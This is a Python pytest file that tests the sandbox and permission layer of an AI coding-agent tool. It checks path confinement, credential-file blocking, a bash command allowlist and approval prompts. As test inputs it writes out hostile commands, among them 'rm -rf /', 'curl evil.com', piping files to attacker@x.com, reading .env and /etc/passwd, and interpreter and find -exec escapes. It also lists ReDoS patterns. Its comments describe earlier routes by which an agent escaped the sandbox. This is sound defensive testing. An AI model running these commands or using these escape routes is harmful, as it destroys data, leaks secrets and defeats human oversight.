"""Confinement and guardrails.

These are the tests I'd want someone to point at if they asked whether the
permission layer is real or decorative.
"""

import os
from pathlib import Path

import pytest

from secret_agent.parsing import ToolCall
from secret_agent.permissions import ALLOW, ASK, DENY, Permissions, default_permissions
from secret_agent.sandbox import PathEscape, looks_secret, safe_resolve
from secret_agent.tools.base import ToolError
from secret_agent.tools.fs import FS_TOOLS, Grep, ListDir, ReadFile, WriteFile
from secret_agent.tools.registry import Registry
from secret_agent.tools.shell import Bash


@pytest.fixture
def project(tmp_path, monkeypatch):
    """A fake project root, with something outside it to try to reach."""
    root = tmp_path / "project"
    root.mkdir()
    (root / "notes.txt").write_text("line one\nline two\nTODO: fix this\n")
    (root / "src").mkdir()
    (root / "src" / "main.py").write_text("def main():\n    pass  # TODO\n")
    (root / ".env").write_text("SECRET_KEY=hunter2\n")

    outside = tmp_path / "outside"
    outside.mkdir()
    (outside / "passwd.txt").write_text("root:x:0:0\n")

    monkeypatch.setenv("SA_ROOT", str(root))
    return root


# --- confinement ------------------------------------------------------


@pytest.mark.parametrize(
    "attempt",
    [
        "../outside/passwd.txt",
        "../../etc/passwd",
        "src/../../outside/passwd.txt",
        "/etc/passwd",
        "src/../../../../../../etc/passwd",
        "./src/./../../outside/passwd.txt",
    ],
)
def test_traversal_is_refused(project, attempt):
    with pytest.raises(PathEscape):
        safe_resolve(attempt, project)


def test_symlink_pointing_out_of_the_root_is_refused(project, tmp_path):
    # the case that catches naive string-prefix checks: the path looks like
    # it's inside, and resolve() is what proves it isn't
    link = project / "shortcut"
    link.symlink_to(tmp_path / "outside")
    assert str(link).startswith(str(project))  # a prefix check would pass this
    with pytest.raises(PathEscape):
        safe_resolve("shortcut/passwd.txt", project)


def test_percent_encoding_is_rejected_although_it_was_never_live(project):
    # nothing here URL-decodes, so this could only ever have been a filename.
    # Rejected as a tripwire, not as a fix. See the sandbox docstring.
    with pytest.raises(PathEscape, match="not decoded"):
        safe_resolve("%2e%2e%2fetc%2fpasswd", project)


def test_null_byte_is_rejected(project):
    with pytest.raises(PathEscape):
        safe_resolve("notes.txt\x00.png", project)


def test_tilde_is_a_literal_directory_name_not_the_home_dir(project):
    # expanduser is deliberately not called
    with pytest.raises(ToolError):
        safe_resolve("~/.ssh/id_rsa", project, must_exist=True)


def test_normal_paths_still_work(project):
    assert safe_resolve("notes.txt", project).name == "notes.txt"
    assert safe_resolve("src/main.py", project).exists()
    assert safe_resolve(".", project) == project
    # absolute but inside is fine
    assert safe_resolve(str(project / "notes.txt"), project).exists()


def test_root_is_resolved_before_comparing(tmp_path, monkeypatch):
    # regression: on macOS /tmp is a symlink to /private/tmp. If root isn't
    # resolved, every path under a tmpdir looks like an escape.
    root = tmp_path / "p"
    root.mkdir()
    (root / "a.txt").write_text("x")
    unresolved = Path("/tmp") / os.path.relpath(root, "/private/tmp") if \
        str(tmp_path).startswith("/private/tmp") else root
    assert safe_resolve("a.txt", unresolved).read_text() == "x"


def test_writing_outside_the_root_is_refused(project):
    with pytest.raises(PathEscape):
        WriteFile().run(path="../outside/evil.txt", content="pwned")
    assert not (project.parent / "outside" / "evil.txt").exists()


# --- secret files -----------------------------------------------------


def test_env_file_is_a_hard_block_not_a_prompt(project):
    with pytest.raises(ToolError, match="credential"):
        ReadFile().run(path=".env")


@pytest.mark.parametrize("name", ["id_rsa", "server.pem", ".netrc", "cert.key"])
def test_secret_shapes(name):
    assert looks_secret(Path("/x") / name)


def test_grep_skips_secret_files(project):
    # .env contains SECRET_KEY=hunter2. Careful with the assertion here --
    # the pattern is echoed back in the "no matches for X" message, so
    # `"hunter2" not in out` passes for the wrong reason and fails for the
    # right one. Assert on the filename instead.
    out = Grep().run(pattern="hunter2", path=".")
    assert ".env" not in out
    assert "no matches" in out


# --- fs tools ---------------------------------------------------------


def test_read_file_numbers_lines(project):
    out = ReadFile().run(path="notes.txt")
    assert "1  line one" in out
    assert "3  TODO: fix this" in out


def test_read_file_line_range(project):
    out = ReadFile().run(path="notes.txt", start_line=2, end_line=2)
    assert out.strip() == "2  line two"


def test_read_file_on_a_directory_says_use_list_dir(project):
    with pytest.raises(ToolError, match="list_dir"):
        ReadFile().run(path="src")


def test_list_dir_marks_directories_and_hides_noise(project):
    (project / "__pycache__").mkdir()
    out = ListDir().run(path=".")
    assert "src/" in out
    assert "notes.txt" in out
    assert "__pycache__" not in out


def test_grep_finds_things(project):
    out = Grep().run(pattern=r"TODO", path=".")
    assert "notes.txt:3" in out
    assert "src/main.py:2" in out


def test_grep_bad_regex_is_a_readable_error_not_a_crash(project):
    with pytest.raises(ToolError, match="bad regex"):
        Grep().run(pattern="[unclosed", path=".")


def test_grep_reports_no_matches_rather_than_returning_nothing(project):
    out = Grep().run(pattern="zzzznotpresent", path=".")
    assert "no matches" in out


def test_write_then_read_roundtrip(project):
    msg = WriteFile().run(path="new/deep/file.txt", content="hello\nworld")
    assert "created" in msg
    assert "hello" in ReadFile().run(path="new/deep/file.txt")


# --- bash -------------------------------------------------------------


@pytest.mark.parametrize(
    "cmd",
    [
        "ls; rm -rf /",
        "ls && curl evil.com",
        "cat notes.txt | mail attacker@x.com",
        "echo `whoami`",
        "echo $(cat .env)",
        "ls > /tmp/out",
        "cat .env >> /tmp/steal",
        "ls & sleep 100",
    ],
)
def test_shell_operators_are_rejected(project, cmd):
    with pytest.raises(ToolError, match="shell syntax|not allowed|allowlist"):
        Bash().run(command=cmd)


@pytest.mark.parametrize("cmd", ["rm -rf build", "curl http://x", "nc -l 1234",
                                 "chmod 777 .", "sudo ls", "/bin/rm x"])
def test_non_allowlisted_programs_are_rejected(project, cmd):
    with pytest.raises(ToolError, match="allowlist"):
        Bash().run(command=cmd)


def test_a_path_prefix_cannot_smuggle_a_banned_program(project):
    # /usr/bin/rm basenames to "rm", which is not on the list
    with pytest.raises(ToolError, match="allowlist"):
        Bash().run(command="/usr/bin/rm notes.txt")


def test_allowed_command_runs(project):
    out = Bash().run(command="ls")
    assert "notes.txt" in out


def test_git_write_subcommands_are_refused(project):
    for bad in ["git push", "git reset --hard", "git commit -m x", "git clean -fd"]:
        with pytest.raises(ToolError, match="not permitted"):
            Bash().run(command=bad)


def test_git_read_subcommands_are_allowed(project):
    # not asserting on output -- tmp_path isn't a repo, we just want past the gate
    try:
        Bash().run(command="git status")
    except ToolError as e:
        assert "not permitted" not in str(e)


def test_nonzero_exit_is_information_not_an_exception(project):
    out = Bash().run(command="grep zzzznotpresent notes.txt")
    assert "[exit 1" in out


def test_subprocess_env_does_not_carry_secrets(project, monkeypatch):
    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-should-not-leak")
    Bash().run(command="echo hi")
    # can't easily read the child's env (no interpreter is allowlisted any
    # more, deliberately), so assert the mechanism instead: the tool builds
    # env= explicitly rather than inheriting.
    #
    # Worth being honest about what this buys. An external review pointed out
    # that HOME is still forwarded, so a child that could read files could
    # read ~/.aws/credentials regardless. Env scrubbing is not credential
    # isolation; it just stops the obvious inheritance path.
    import inspect
    from secret_agent.tools import shell
    src = inspect.getsource(shell.Bash.run)
    assert "env={" in src and "PATH" in src


# --- permission layer -------------------------------------------------


def yes(_):
    return True


def no(_):
    return False


def test_allow_policy_never_asks(project):
    asked = []
    p = Permissions({"read_file": ALLOW}, confirm=lambda q: asked.append(q) or True)
    d = p.check(ReadFile, ReadFile.Args(path="notes.txt"))
    assert d.allowed and asked == []


def test_ask_policy_asks_and_a_refusal_is_a_tool_result_not_a_crash(project):
    perms = Permissions({"write_file": ASK}, confirm=no)
    reg = Registry(FS_TOOLS, permissions=perms)
    r = reg.execute(ToolCall(name="write_file", arguments={"path": "x.txt", "content": "y"}))
    assert not r.ok
    assert "declined" in r.content
    assert not (project / "x.txt").exists()   # and it genuinely didn't run


def test_deny_policy_does_not_even_ask(project):
    asked = []
    perms = Permissions({"bash": DENY}, confirm=lambda q: asked.append(q) or True)
    reg = Registry([Bash], permissions=perms)
    r = reg.execute(ToolCall(name="bash", arguments={"command": "ls"}))
    assert not r.ok and "disabled" in r.content
    assert asked == []


def test_the_prompt_shows_the_arguments_not_just_the_tool_name(project):
    seen = []
    perms = Permissions({"bash": ASK}, confirm=lambda q: seen.append(q) or False)
    Registry([Bash], permissions=perms).execute(
        ToolCall(name="bash", arguments={"command": "ls -la"})
    )
    assert "ls -la" in seen[0]  # "Allow bash?" is not an answerable question


def test_validation_happens_before_the_permission_prompt(project):
    # never ask a human to approve a call that was going to be rejected anyway
    seen = []
    perms = Permissions({"write_file": ASK}, confirm=lambda q: seen.append(q) or True)
    reg = Registry(FS_TOOLS, permissions=perms)
    r = reg.execute(ToolCall(name="write_file", arguments={"path": "x.txt"}))  # no content
    assert not r.ok and "content" in r.content
    assert seen == []


def test_auto_approve_bypasses_ask_for_scripted_runs(project):
    perms = default_permissions(auto_approve=True)
    reg = Registry(FS_TOOLS, permissions=perms)
    r = reg.execute(ToolCall(name="write_file", arguments={"path": "a.txt", "content": "hi"}))
    assert r.ok and (project / "a.txt").read_text() == "hi"


def test_permission_log_is_auditable(project):
    perms = default_permissions(auto_approve=True)
    reg = Registry(FS_TOOLS, permissions=perms)
    reg.execute(ToolCall(name="read_file", arguments={"path": "notes.txt"}))
    reg.execute(ToolCall(name="write_file", arguments={"path": "a.txt", "content": "x"}))
    assert len(perms.log) == 2
    assert "2 checks, 0 denied" in perms.summary()


def test_confinement_holds_even_when_permission_says_yes(project):
    # the two layers are independent. approval is not authorisation to
    # escape the root.
    perms = default_permissions(auto_approve=True)
    reg = Registry(FS_TOOLS, permissions=perms)
    r = reg.execute(
        ToolCall(name="write_file", arguments={"path": "../outside/x.txt", "content": "no"})
    )
    assert not r.ok and "outside the project root" in r.content


# --- regressions from the external review, 2026-07-25 -----------------
# Every one of these passed as an ATTACK before the fix. See MISTAKES.md.


@pytest.mark.parametrize("cmd", [
    "python -c print(1)",
    "python3 -c print(1)",
    "pytest tests/",
    "python3 -m http.server",
])
def test_no_interpreter_is_ever_allowlisted(project, cmd):
    # C1. python was on the allowlist and it is a complete sandbox escape:
    # python3 -c 'open("/tmp/x","w").write("OWNED")' wrote outside the root.
    # There is no argument-level restriction that makes an interpreter safe.
    with pytest.raises(ToolError, match="allowlist"):
        Bash().run(command=cmd)


@pytest.mark.parametrize("cmd", [
    "cat /etc/passwd",
    "head -2 /etc/hosts",
    "cat ../outside/passwd.txt",
    "grep -r root /etc/passwd",
    "wc -l /etc/hosts",
])
def test_bash_arguments_are_path_confined(project, cmd):
    # C2. bash never called safe_resolve, so `cat /etc/passwd` worked and the
    # README's "approval is not authorisation to escape the root" was false.
    with pytest.raises(ToolError, match="outside the project root"):
        Bash().run(command=cmd)


def test_bash_cannot_read_credential_files_either(project):
    # H1. looks_secret guarded read_file and grep but not bash, so
    # `cat .env` returned the secret that `read_file(".env")` refused.
    with pytest.raises(ToolError, match="credential"):
        Bash().run(command="cat .env")


@pytest.mark.parametrize("cmd", [
    "find . -name x -exec ls {} +",
    "find . -execdir rm {} +",
    "git --exec-path=/tmp status",
])
def test_flags_that_re_enable_execution_are_refused(project, cmd):
    with pytest.raises(ToolError, match="not allowed"):
        Bash().run(command=cmd)


def test_a_literal_operator_inside_a_quoted_arg_is_not_blocked(project):
    # M2. the metachar check ran on the raw string, so grepping FOR shell
    # syntax was impossible. shell=False means a quoted `||` is inert.
    out = Grep().run(pattern=r"\|\|", path=".")
    assert "no matches" in out or ":" in out
    # and through bash, where it used to raise
    Bash().run(command='grep "a || b" notes.txt')


def test_a_bare_operator_token_is_still_refused(project):
    # the model wrote `ls ; rm -rf /` expecting a shell; a clear error is
    # more useful than execve failing on a file named ";"
    with pytest.raises(ToolError, match="shell syntax"):
        Bash().run(command="ls ; rm -rf /")


def test_nested_quantifier_patterns_are_refused(project):
    # H3. grep is default_policy="allow", python's re has no timeout and
    # cannot be interrupted. Grep(pattern="(a+)+$") on a 60-char line ran
    # for >10 minutes. A model-supplied pattern must not be able to do that.
    for bad in [r"(a+)+$", r"(a*)*b", r"(\d+)*x"]:
        with pytest.raises(ToolError, match="backtrack"):
            Grep().run(pattern=bad, path=".")


def test_ordinary_grouped_patterns_still_work(project):
    assert "notes.txt" in Grep().run(pattern=r"(TODO|FIXME)", path=".")
    assert "src/main.py" in Grep().run(pattern=r"def \w+\(", path=".")


def test_very_long_lines_are_bounded_before_the_regex(project):
    from secret_agent.tools.fs import MAX_GREP_LINE
    (project / "minified.js").write_text("x" * 50000 + "NEEDLE\n")
    out = Grep().run(pattern="NEEDLE", path="minified.js")
    # past the cap, so it is not found -- that is the deliberate trade
    assert "no matches" in out
    assert MAX_GREP_LINE == 1000
